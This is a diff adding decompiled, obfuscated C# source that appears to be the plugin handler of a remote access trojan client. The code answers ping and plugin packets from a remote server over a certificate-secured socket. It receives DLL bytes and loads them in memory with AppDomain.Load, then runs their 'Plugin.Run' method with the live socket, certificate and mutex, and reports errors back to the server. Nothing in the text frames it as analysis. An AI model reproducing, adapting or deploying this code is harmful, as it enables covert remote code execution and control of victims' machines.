@@ -1,0 +1,199 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Net.Sockets;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
+using Microsoft.CSharp.RuntimeBinder;
+
+// Token: 0x0200000F RID: 15
+public static class GClass11
+{
+	// Token: 0x060000DA RID: 218 RVA: 0x00003F4C File Offset: 0x0000214C
+	public static void smethod_0(object object_0)
+	{
+		try
+		{
+			GClass17 gclass = new GClass17();
+			gclass.method_28((byte[])object_0);
+			string text = gclass.method_21("Packet").String_0;
+			if (GClass11.smethod_4(text, "pong"))
+			{
+				Network_Class.Boolean_1 = false;
+				GClass17 gclass2 = new GClass17();
+				gclass2.method_21("Packet").method_23("pong");
+				gclass2.method_21("Message").method_10((long)Network_Class.Int32_0);
+				Network_Class.smethod_6(gclass2.method_31());
+				Network_Class.Int32_0 = 0;
+			}
+			else
+			{
+				if (!GClass11.smethod_4(text, "plugin"))
+				{
+					if (!GClass11.smethod_4(text, "savePlugin"))
+					{
+						goto IL_01AE;
+					}
+					GClass10.smethod_0(gclass.method_21("Hash").String_0, gclass.method_21("Dll").method_16());
+					using (List<GClass17>.Enumerator enumerator = GClass11.list_0.ToList<GClass17>().GetEnumerator())
+					{
+						while (enumerator.MoveNext())
+						{
+							GClass17 gclass3 = enumerator.Current;
+							if (GClass11.smethod_4(gclass3.method_21("Dll").String_0, gclass.method_21("Hash").String_0))
+							{
+								GClass11.smethod_1(gclass3);
+								GClass11.list_0.Remove(gclass3);
+							}
+						}
+						goto IL_01AE;
+					}
+				}
+				try
+				{
+					if (GClass10.smethod_1(gclass.method_21("Dll").String_0) == null)
+					{
+						GClass11.list_0.Add(gclass);
+						GClass17 gclass4 = new GClass17();
+						gclass4.method_21("Packet").method_23("sendPlugin");
+						gclass4.method_21("Hashes").method_23(gclass.method_21("Dll").String_0);
+						Network_Class.smethod_6(gclass4.method_31());
+					}
+					else
+					{
+						GClass11.smethod_1(gclass);
+					}
+				}
+				catch (Exception ex)
+				{
+					GClass11.smethod_3(GClass11.smethod_5(ex));
+				}
+			}
+			IL_01AE:;
+		}
+		catch (Exception ex2)
+		{
+			GClass11.smethod_3(GClass11.smethod_5(ex2));
+		}
+	}
+
+	// Token: 0x060000DB RID: 219 RVA: 0x00004164 File Offset: 0x00002364
+	private static void smethod_1(GClass17 gclass17_0)
+	{
+		object obj = GClass11.smethod_9(GClass11.smethod_8(GClass11.smethod_7(GClass11.smethod_6(), GClass18.smethod_0(GClass10.smethod_1(gclass17_0.method_21("Dll").String_0))), "Plugin.Plugin"));
+		if (GClass11.Class1.callSite_0 == null)
+		{
+			GClass11.Class1.callSite_0 = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(GClass11.smethod_12(CSharpBinderFlags.ResultDiscarded, "Run", null, GClass11.smethod_10(typeof(GClass11).TypeHandle), new CSharpArgumentInfo[]
+			{
+				GClass11.smethod_11(CSharpArgumentInfoFlags.None, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null),
+				GClass11.smethod_11(CSharpArgumentInfoFlags.UseCompileTimeType, null)
+			}));
+		}
+		GClass11.Class1.callSite_0.Target(GClass11.Class1.callSite_0, obj, Network_Class.Socket_0, GClass1.x509Certificate2_0, GClass1.string_13, gclass17_0.method_21("Msgpack").method_16(), GClass8.mutex_0, GClass1.string_7, GClass1.string_12, GClass1.string_3);
+		GClass11.smethod_2();
+	}
+
+	// Token: 0x060000DC RID: 220 RVA: 0x000025E3 File Offset: 0x000007E3
+	private static void smethod_2()
+	{
+		GClass17 gclass = new GClass17();
+		gclass.method_21("Packet").String_0 = "Received";
+		Network_Class.smethod_6(gclass.method_31());
+		GClass11.smethod_13(1000);
+	}
+
+	// Token: 0x060000DD RID: 221 RVA: 0x00002613 File Offset: 0x00000813
+	public static void smethod_3(string string_1)
+	{
+		GClass17 gclass = new GClass17();
+		gclass.method_21("Packet").String_0 = "Error";
+		gclass.method_21("Error").String_0 = string_1;
+		Network_Class.smethod_6(gclass.method_31());
+	}
+
+	// Token: 0x060000DF RID: 223 RVA: 0x00002230 File Offset: 0x00000430
+	static bool smethod_4(string string_1, string string_2)
+	{
+		return string_1 == string_2;
+	}
+
+	// Token: 0x060000E0 RID: 224 RVA: 0x000025AD File Offset: 0x000007AD
+	static string smethod_5(Exception exception_0)
+	{
+		return exception_0.Message;
+	}
+
+	// Token: 0x060000E1 RID: 225 RVA: 0x00002656 File Offset: 0x00000856
+	static AppDomain smethod_6()
+	{
+		return AppDomain.CurrentDomain;
+	}
+
+	// Token: 0x060000E2 RID: 226 RVA: 0x0000265D File Offset: 0x0000085D
+	static Assembly smethod_7(AppDomain appDomain_0, byte[] byte_0)
+	{
+		return appDomain_0.Load(byte_0);
+	}
+
+	// Token: 0x060000E3 RID: 227 RVA: 0x00002666 File Offset: 0x00000866
+	static Type smethod_8(Assembly assembly_0, string string_1)
+	{
+		return assembly_0.GetType(string_1);
+	}
+
+	// Token: 0x060000E4 RID: 228 RVA: 0x0000266F File Offset: 0x0000086F
+	static object smethod_9(Type type_0)
+	{
+		return Activator.CreateInstance(type_0);
+	}
+
+	// Token: 0x060000E5 RID: 229 RVA: 0x00002081 File Offset: 0x00000281
+	static Type smethod_10(RuntimeTypeHandle runtimeTypeHandle_0)
+	{
+		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
+	}
+
+	// Token: 0x060000E6 RID: 230 RVA: 0x00002677 File Offset: 0x00000877
+	static CSharpArgumentInfo smethod_11(CSharpArgumentInfoFlags csharpArgumentInfoFlags_0, string string_1)
+	{
+		return CSharpArgumentInfo.Create(csharpArgumentInfoFlags_0, string_1);
+	}
+
+	// Token: 0x060000E7 RID: 231 RVA: 0x00002680 File Offset: 0x00000880
+	static CallSiteBinder smethod_12(CSharpBinderFlags csharpBinderFlags_0, string string_1, IEnumerable<Type> ienumerable_0, Type type_0, IEnumerable<CSharpArgumentInfo> ienumerable_1)
+	{
+		return Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(csharpBinderFlags_0, string_1, ienumerable_0, type_0, ienumerable_1);
+	}
+
+	// Token: 0x060000E8 RID: 232 RVA: 0x000020D8 File Offset: 0x000002D8
+	static void smethod_13(int int_0)
+	{
+		Thread.Sleep(int_0);
+	}
+
+	// Token: 0x04000035 RID: 53
+	public static List<GClass17> list_0 = new List<GClass17>();
+
+	// Token: 0x04000036 RID: 54
+	public static string string_0;
+
+	// Token: 0x02000010 RID: 16
+	[CompilerGenerated]
+	private static class Class1
+	{
+		// Token: 0x04000037 RID: 55
+		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> callSite_0;
+
+		// Token: 0x04000038 RID: 56
+		public static string string_0;
+	}
+}
